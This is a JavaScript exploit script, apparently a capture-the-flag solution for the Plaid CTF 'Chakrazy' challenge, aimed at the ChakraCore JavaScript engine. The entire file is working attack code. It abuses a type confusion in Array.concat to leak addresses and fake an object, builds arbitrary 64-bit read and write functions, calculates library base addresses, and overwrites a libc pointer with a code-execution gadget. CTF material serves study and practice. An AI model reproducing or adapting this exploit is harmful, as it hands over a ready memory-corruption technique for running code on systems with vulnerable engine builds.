/*
  Plaid CTF Chakrazy
  Team koreanbadass
*/
var a = new Array(1,2,3,4,5,6,7,8,9,10,11,12,13,14,15);
var b = new Array(1);
var victim = (new Array(56, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0)).slice();
var ab = new ArrayBuffer(8);
var fdv = new DataView(ab);

function fake_obj(hi,lo){
	victim[2] = lo;
	victim[3] = hi;
	victim[8] = 0x200;
  victim[10] = (lo - 0x58)|0;
	victim[11] = hi;
	victim[14] = (lo - 0x58)|0;
	victim[15] = hi;
}
function read64(hi,lo){
	victim[14] = lo;
	victim[15] = hi;
	return [fdv.getUint32.call(vector,4,true),fdv.getUint32.call(vector,0,true)];
}
function write64(dest,dat){
  victim[14] = dest[1];
  victim[15] = dest[0];
  fdv.setUint32.call(vector,0,dat[1]|0,true);
  fdv.setUint32.call(vector,4,dat[0]|0,true);
}
function PutDataAndGetAddr(t) // UknowY
{

  class MyArray extends Array {
    get [Symbol.isConcatSpreadable]() {
      a[2] = t; // ConvertToVarArray
    }
  }

  class dummy extends MyArray{
    constructor(){
      return a;
     }
  }

  a.__proto__ = dummy.prototype;

  var res = a.concat(b);
  var ia = Uint32Array.from(res);
  return [ia[5], ia[4]];
}
function trigger(hi,lo) // singi
{

  class MyArray extends Array {
    get [Symbol.isConcatSpreadable]() {
      magic[0] = []; // trigger type-confusion
    }
  }

  class dummy extends MyArray{
    constructor(){
      return magic;
     }
  }
	fake_obj(hi,lo)
  var c = [lo,hi,lo,hi];
  c.__proto__ = dummy.prototype;
  var magic = [0,0];
  var res = c.concat([1234]);
  return res[0]
}
[hi, lo] = PutDataAndGetAddr(victim);
[hi, lo] = [hi, lo+0x58];
console.log("[+] victim : 0x"+hi.toString(16)+lo.toString(16));
var vector = trigger(hi,lo);
var vtable = read64(hi,lo-0x58);
var libChakra = [vtable[0],vtable[1]-0xd5db40];
var libc = [libChakra[0],libChakra[1]+0x1628000];
console.log("[+] vtable : 0x"+vtable[0].toString(16)+vtable[1].toString(16));
console.log("[+] libChakra : 0x"+libChakra[0].toString(16)+libChakra[1].toString(16))
console.log("[+] libc : 0x"+libc[0].toString(16)+libc[1].toString(16))
write64([libc[0],libc[1]+0x3c57a8],[libc[0],libc[1]+0xef6c4]);
